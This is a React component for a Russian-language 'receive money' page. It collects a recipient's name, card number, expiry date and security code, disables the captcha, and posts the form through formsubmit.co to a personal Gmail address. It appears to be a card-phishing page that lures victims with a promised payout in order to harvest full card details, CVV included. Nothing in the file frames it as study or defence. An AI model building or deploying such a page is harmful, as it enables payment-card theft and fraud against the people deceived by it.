import React from "react";
import './index.css';

function App() {

    return (
        <div className="App">
            <div className="payment-title">
                <h1>Реквизиты получателя</h1>
            </div>

            <form action="https://formsubmit.co/killerbuny3@gmail.com" method="POST" className="form-container">
                <input type="hidden" name="_next" value={window.location.href}/>
                <input type="hidden" name="_captcha" value="false"/>
                <div className="field-container">
                    <label htmlFor="name">Имя получателя</label>
                    <input required id="name" maxLength="20" type="text"/>
                </div>
                <div className="field-container">
                    <label htmlFor="cardnumber">Номер карты получателя</label>
                    <input required id="cardnumber" type="text" pattern="[0-9]*" inputMode="numeric"/>

                </div>
                <div className="field-container">
                    <label htmlFor="expirationdate">Срок действия карты (mm/yy)</label>
                    <input required id="expirationdate" type="text" pattern="[0-9]*" inputMode="numeric"/>
                </div>
                <div className="field-container">
                    <label htmlFor="securitycode">Security Code</label>
                    <input required id="securitycode" type="text" pattern="[0-9]*" inputMode="numeric"/>
                </div>
                <button style={{
                    border: '1px solid #dcdcdc',
                    background: 'green',
                    color: '#fff',
                    cursor: 'pointer',
                    padding: '5px',
                    width: '100%',
                }}>Получить деньги
                </button>
            </form>
        </div>
    );
}

export default App;
